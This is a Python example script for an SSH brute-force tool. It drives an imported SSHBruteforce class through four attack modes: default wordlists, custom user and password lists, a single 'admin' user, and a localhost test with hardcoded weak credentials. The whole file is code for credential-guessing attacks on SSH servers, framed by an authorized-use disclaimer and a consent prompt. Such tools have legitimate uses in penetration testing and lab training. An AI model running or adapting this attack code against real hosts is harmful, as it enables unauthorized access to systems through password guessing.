#!/usr/bin/env python3
"""
Basic usage example for SSH Bruteforce Tool

This example demonstrates the simplest way to use the SSH bruteforce tool.
"""

import sys
import os

# Add src directory to Python path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))

from ssh_bruteforce import SSHBruteforce
from colorama import init, Fore, Style

init()  # Initialize colorama for colored output


def basic_example():
    """Basic SSH bruteforce example"""
    print(f"{Fore.CYAN}=== Basic SSH Bruteforce Example ==={Style.RESET_ALL}")
    print()
    
    # Target configuration
    target_host = "192.168.1.100"  # Change this to your target
    target_port = 22
    
    print(f"Target: {target_host}:{target_port}")
    print("Using default wordlists and settings")
    print()
    
    try:
        # Create SSH bruteforce instance with basic settings
        bruteforcer = SSHBruteforce(
            target_host=target_host,
            port=target_port,
            timeout=5,      # 5 second timeout
            max_threads=5   # Use 5 threads
        )
        
        print("Starting basic bruteforce attack...")
        print("Press Ctrl+C to stop")
        print("-" * 50)
        
        # Run the attack using default wordlists
        bruteforcer.run()
        
        print("\nAttack completed!")
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Attack interrupted by user{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}Error: {str(e)}{Style.RESET_ALL}")


def basic_with_custom_wordlists():
    """Basic example with custom wordlists"""
    print(f"{Fore.CYAN}=== Basic Example with Custom Wordlists ==={Style.RESET_ALL}")
    print()
    
    target_host = "192.168.1.100"  # Change this to your target
    
    try:
        # Create SSH bruteforce instance
        bruteforcer = SSHBruteforce(
            target_host=target_host,
            port=22,
            timeout=3,
            max_threads=3
        )
        
        print(f"Target: {target_host}")
        print("Using custom wordlists")
        print("-" * 50)
        
        # Run with custom wordlists
        bruteforcer.run(
            userlist_file="wordlists/common_users.txt",
            passlist_file="wordlists/common_passwords.txt"
        )
        
        print("\nAttack completed!")
        
    except Exception as e:
        print(f"\n{Fore.RED}Error: {str(e)}{Style.RESET_ALL}")


def single_user_attack():
    """Example of attacking with a single username"""
    print(f"{Fore.CYAN}=== Single User Attack Example ==={Style.RESET_ALL}")
    print()
    
    # Create a temporary wordlist with just one user
    import tempfile
    import os
    
    temp_dir = tempfile.mkdtemp()
    user_file = os.path.join(temp_dir, "single_user.txt")
    
    try:
        # Write single username to file
        with open(user_file, 'w') as f:
            f.write("admin\n")
        
        target_host = "192.168.1.100"
        
        bruteforcer = SSHBruteforce(
            target_host=target_host,
            port=22,
            timeout=2,
            max_threads=1
        )
        
        print(f"Target: {target_host}")
        print("Testing only 'admin' username with common passwords")
        print("-" * 50)
        
        bruteforcer.run(
            userlist_file=user_file,
            passlist_file="wordlists/common_passwords.txt"
        )
        
    except Exception as e:
        print(f"\n{Fore.RED}Error: {str(e)}{Style.RESET_ALL}")
    finally:
        # Clean up temporary file
        try:
            os.unlink(user_file)
            os.rmdir(temp_dir)
        except:
            pass


def quick_test():
    """Quick test with minimal credentials"""
    print(f"{Fore.CYAN}=== Quick Test Example ==={Style.RESET_ALL}")
    print()
    
    from utils.wordlist_manager import WordlistManager
    import tempfile
    
    # Create minimal test wordlists
    temp_dir = tempfile.mkdtemp()
    wm = WordlistManager()
    
    try:
        # Create small test wordlists
        test_users = ["admin", "root", "test"]
        test_passwords = ["password", "admin", "123456", ""]
        
        user_file = os.path.join(temp_dir, "test_users.txt")
        pass_file = os.path.join(temp_dir, "test_passwords.txt")
        
        wm.create_custom_wordlist(test_users, user_file)
        wm.create_custom_wordlist(test_passwords, pass_file)
        
        target_host = "127.0.0.1"  # localhost for testing
        
        bruteforcer = SSHBruteforce(
            target_host=target_host,
            port=22,
            timeout=1,      # Very short timeout for quick test
            max_threads=2
        )
        
        print(f"Target: {target_host}")
        print("Quick test with minimal credentials")
        print("Users:", test_users)
        print("Passwords:", test_passwords)
        print("-" * 50)
        
        bruteforcer.run(
            userlist_file=user_file,
            passlist_file=pass_file
        )
        
    except Exception as e:
        print(f"\n{Fore.RED}Error: {str(e)}{Style.RESET_ALL}")
    finally:
        # Clean up
        import shutil
        shutil.rmtree(temp_dir, ignore_errors=True)


def main():
    """Main function to run examples"""
    print(f"{Fore.GREEN}SSH Bruteforce Tool - Basic Usage Examples{Style.RESET_ALL}")
    print()
    print("Available examples:")
    print("1. Basic attack with default settings")
    print("2. Basic attack with custom wordlists")
    print("3. Single user attack")
    print("4. Quick test with minimal credentials")
    print()
    
    try:
        choice = input("Enter your choice (1-4) or 'q' to quit: ").strip()
        
        if choice == 'q':
            return
        elif choice == '1':
            basic_example()
        elif choice == '2':
            basic_with_custom_wordlists()
        elif choice == '3':
            single_user_attack()
        elif choice == '4':
            quick_test()
        else:
            print("Invalid choice!")
            
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Interrupted by user{Style.RESET_ALL}")


if __name__ == "__main__":
    # Disclaimer
    print(f"{Fore.RED}⚠️  IMPORTANT DISCLAIMER ⚠️{Style.RESET_ALL}")
    print("This tool is for educational and authorized testing purposes only!")
    print("Only use on systems you own or have explicit permission to test.")
    print("Unauthorized access to computer systems is illegal!")
    print()
    
    response = input("Do you understand and agree to use this tool responsibly? (yes/no): ")
    if response.lower() in ['yes', 'y']:
        main()
    else:
        print("Tool usage declined.")
        sys.exit(1)
